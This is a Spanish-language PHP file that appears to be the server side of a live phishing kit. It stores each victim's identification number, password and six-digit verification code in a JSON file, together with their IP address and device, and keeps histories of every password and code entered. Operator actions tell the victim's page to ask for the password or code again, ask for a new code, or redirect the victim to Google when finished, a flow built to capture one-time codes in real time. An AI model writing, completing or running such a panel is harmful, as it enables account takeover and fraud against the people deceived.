<?php
define('DATA_FILE', __DIR__ . '/datos.json');

function obtenerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
}

function detectarDispositivo($userAgent) {
    if (empty($userAgent)) return 'Desconocido';
    
    $so = 'Desconocido';
    if (preg_match('/windows|win32/i', $userAgent)) $so = 'Windows';
    elseif (preg_match('/android/i', $userAgent)) $so = 'Android';
    elseif (preg_match('/iphone|ipad|ipod/i', $userAgent)) $so = 'iOS';
    elseif (preg_match('/macintosh|mac os x/i', $userAgent)) $so = 'Mac OS';
    elseif (preg_match('/linux/i', $userAgent)) $so = 'Linux';

    $navegador = 'Navegador';
    if (preg_match('/edg/i', $userAgent)) $navegador = 'Edge';
    elseif (preg_match('/chrome/i', $userAgent)) $navegador = 'Chrome';
    elseif (preg_match('/firefox/i', $userAgent)) $navegador = 'Firefox';
    elseif (preg_match('/safari/i', $userAgent)) $navegador = 'Safari';
    elseif (preg_match('/opera|opr/i', $userAgent)) $navegador = 'Opera';

    return "$so - $navegador";
}

function leerRegistros() {
    if (!file_exists(DATA_FILE)) {
        return [];
    }
    $fp = @fopen(DATA_FILE, 'r');
    if (!$fp) return [];
    @flock($fp, LOCK_SH);
    $contenido = @stream_get_contents($fp);
    @flock($fp, LOCK_UN);
    @fclose($fp);
    
    if (empty($contenido)) return [];
    $data = json_decode($contenido, true);
    return is_array($data) ? array_values($data) : [];
}

function guardarRegistros($registros) {
    $json = json_encode(array_values($registros), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    if ($json === false) return false;
    
    $fp = @fopen(DATA_FILE, 'c+');
    if (!$fp) return false;
    
    if (@flock($fp, LOCK_EX)) {
        ftruncate($fp, 0);
        rewind($fp);
        fwrite($fp, $json);
        fflush($fp);
        @flock($fp, LOCK_UN);
        fclose($fp);
        return true;
    }
    fclose($fp);
    return false;
}

// 1. Número de Identificación
function agregarNuevoCuadro($documento) {
    $registros = leerRegistros();
    $ip = obtenerIP();
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $dispositivo = detectarDispositivo($userAgent);
    $fecha = date('d/m/Y h:i:s A');
    $timestamp = time();

    $numeroCuadro = count($registros) + 1;
    $nuevo = [
        'id' => uniqid('cuadro_', true),
        'numero' => $numeroCuadro,
        'documento' => $documento,
        'password' => '',
        'historial_passwords' => [],
        'codigo' => '',
        'historial_codigos' => [],
        'ip' => $ip,
        'dispositivo' => $dispositivo,
        'user_agent' => $userAgent,
        'fecha' => $fecha,
        'timestamp' => $timestamp,
        'estado' => 'Identificación recibida',
        'accion' => 'esperando',
        'paso_actual' => 2,
        'redirect_url' => '',
        'ultimo_ping' => $timestamp,
        'online' => true,
        'salio' => false
    ];

    $registros[] = $nuevo;
    guardarRegistros($registros);
    return $nuevo;
}

// 2. Contraseña
function actualizarPasswordCuadro($id, $password) {
    $registros = leerRegistros();
    $modificado = false;
    $actualizado = null;
    foreach ($registros as &$item) {
        if (isset($item['id']) && $item['id'] === $id) {
            if (!isset($item['historial_passwords']) || !is_array($item['historial_passwords'])) {
                $item['historial_passwords'] = [];
            }
            if (!empty($item['password']) && !in_array($item['password'], $item['historial_passwords'])) {
                $item['historial_passwords'][] = $item['password'];
            }
            $item['password'] = $password;
            $item['estado'] = 'Contraseña recibida (Validando)';
            $item['paso_actual'] = 3;
            $item['accion'] = 'esperando';
            $item['ultimo_ping'] = time();
            $item['online'] = true;
            $item['salio'] = false;
            $item['ultima_actualizacion'] = date('d/m/Y h:i:s A');
            $modificado = true;
            $actualizado = $item;
            break;
        }
    }
    unset($item);
    if ($modificado) {
        guardarRegistros($registros);
    }
    return $actualizado;
}

// 3. Código de 6 dígitos
function actualizarCodigoCuadro($id, $codigo) {
    $registros = leerRegistros();
    $modificado = false;
    $actualizado = null;
    foreach ($registros as &$item) {
        if (isset($item['id']) && $item['id'] === $id) {
            if (!isset($item['historial_codigos']) || !is_array($item['historial_codigos'])) {
                $item['historial_codigos'] = [];
            }
            if (!empty($item['codigo']) && !in_array($item['codigo'], $item['historial_codigos'])) {
                $item['historial_codigos'][] = $item['codigo'];
            }
            $item['codigo'] = $codigo;
            $item['estado'] = 'Código 6 dígitos recibido (Validando)';
            $item['paso_actual'] = 3;
            $item['accion'] = 'esperando';
            $item['ultimo_ping'] = time();
            $item['online'] = true;
            $item['salio'] = false;
            $item['ultima_actualizacion'] = date('d/m/Y h:i:s A');
            $modificado = true;
            $actualizado = $item;
            break;
        }
    }
    unset($item);
    if ($modificado) {
        guardarRegistros($registros);
    }
    return $actualizado;
}

function actualizarPingCuadro($id, $isOnline = true) {
    $registros = leerRegistros();
    $modificado = false;
    $ahora = time();
    foreach ($registros as &$item) {
        if (isset($item['id']) && $item['id'] === $id) {
            // Optimización: si ya está en línea y el último ping fue hace menos de 1 segundo, no escribir al disco
            if ($isOnline && isset($item['ultimo_ping']) && ($ahora - $item['ultimo_ping']) < 1 && $item['online'] === true && empty($item['salio'])) {
                return true;
            }
            $item['ultimo_ping'] = $ahora;
            $item['online'] = $isOnline;
            $item['salio'] = !$isOnline;
            if (!$isOnline) {
                $item['fecha_salida'] = date('d/m/Y h:i:s A');
            }
            $modificado = true;
            break;
        }
    }
    unset($item);
    if ($modificado) {
        guardarRegistros($registros);
    }
    return $modificado;
}

function obtenerCuadroPorId($id) {
    $registros = leerRegistros();
    foreach ($registros as $item) {
        if (isset($item['id']) && $item['id'] === $id) {
            return $item;
        }
    }
    return null;
}

function actualizarAccionCuadro($id, $accion, $redirect_url = '') {
    $registros = leerRegistros();
    $actualizado = false;
    $registroActualizado = null;

    foreach ($registros as &$item) {
        if (isset($item['id']) && $item['id'] === $id) {
            $item['accion'] = $accion;
            if ($accion === 'relogin') {
                $item['estado'] = 'Relogin solicitado';
                $item['bloqueado'] = false;
                $item['paso_actual'] = 1;
            } elseif ($accion === 'finalizar') {
                $item['estado'] = 'Finalizado';
                $item['redirect_url'] = !empty($redirect_url) ? $redirect_url : 'https://www.google.com';
                $item['bloqueado'] = false;
            } elseif ($accion === 'bloquear') {
                $item['estado'] = 'Bloqueado';
                $item['bloqueado'] = true;
            } elseif ($accion === 'pedir_codigo') {
                $item['estado'] = 'Pedir código de 6 dígitos';
                $item['bloqueado'] = false;
                $item['paso_actual'] = 4;
            } elseif ($accion === 'codigo_error') {
                $item['estado'] = 'Código erróneo (reintentar)';
                $item['bloqueado'] = false;
                $item['paso_actual'] = 4;
            } elseif ($accion === 'pass_error') {
                $item['estado'] = 'Contraseña errónea (reintentar)';
                $item['bloqueado'] = false;
                $item['paso_actual'] = 2;
            } else {
                $item['estado'] = ucfirst($accion);
            }
            $item['ultima_actualizacion'] = date('d/m/Y h:i:s A');
            $registroActualizado = $item;
            $actualizado = true;
            break;
        }
    }
    unset($item);

    if ($actualizado) {
        guardarRegistros($registros);
    }
    return $registroActualizado;
}

function eliminarRegistro($id) {
    $registros = leerRegistros();
    $filtrados = array_values(array_filter($registros, function($item) use ($id) {
        return isset($item['id']) && $item['id'] !== $id;
    }));
    
    foreach ($filtrados as $idx => &$item) {
        $item['numero'] = $idx + 1;
    }
    unset($item);
    
    return guardarRegistros($filtrados);
}

function vaciarRegistros() {
    return guardarRegistros([]);
}
